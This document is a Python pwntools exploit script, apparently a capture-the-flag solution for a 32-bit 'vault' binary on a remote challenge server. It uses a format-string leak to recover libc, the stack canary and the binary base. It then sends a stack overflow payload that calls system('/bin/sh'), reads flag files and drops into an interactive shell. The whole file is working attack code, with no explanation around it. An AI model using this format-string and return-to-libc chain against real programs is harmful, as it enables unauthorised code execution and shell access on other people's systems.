from pwn import *

context.log_level = "debug"
context.arch = "i386"
context.os = "linux"
context.terminal = ["/usr/bin/tmux", "sp", "-h"]

f_remote = True if "remote" in sys.argv else False
f_gdb = True if "gdb" in sys.argv else False

vuln_path = "./vault"
elf = ELF(vuln_path)
libc = elf.libc

io = process([vuln_path]) if not f_remote else remote(
    "play.scriptsorcerers.xyz", 10022)


def ddebug(b=""):
    if not f_gdb:
        return
    gdb.attach(io, gdbscript=b)
    pause()

# u64(io.recvuntil("\x7f")[-6:].ljust(8, b"\x00"))


ddebug("breakrva 0x000012F6  \n breakrva 0x0134d\n continue")
io.sendlineafter(">", "1")
io.sendlineafter("vault?", "%16$p--%23$p--%27$p--")
io.sendlineafter(">", "2")

io.recvuntil("ur stuff: ", drop=True)
leak = int(io.recvuntil("--", drop=True), 16)
libc.address = leak - 0x22d5c0
log.success("libc :-----> " + hex(libc.address))

system_addr = libc.symbols.get("system")
binsh_addr = next(libc.search("/bin/sh"))

log.success("system:-----> " + hex(system_addr))
log.success("binsh:-----> " + hex(binsh_addr))

canary = int(io.recvuntil("--", drop=True), 16)
elf.address = int(io.recvuntil("--", drop=True), 16) - 0x13ae
log.success("elf:-----> " + hex(elf.address))
payload = b"a" * (0x50 - 16)
payload += p32(canary)
payload += p32(0)
payload += p32(elf.address + 0x3ff4)
payload += p32(0)
payload += p32(system_addr)
payload += p32(0)
payload += p32(binsh_addr)

# payload += p32(elf.symbols["printf"])
# payload += p32(0)
# payload += p32(elf.got["setbuf"])

io.sendlineafter(">", "1")
io.sendlineafter("vault?", payload)
io.sendlineafter(">", "3")

io.sendline(b"cat f*")


io.interactive()
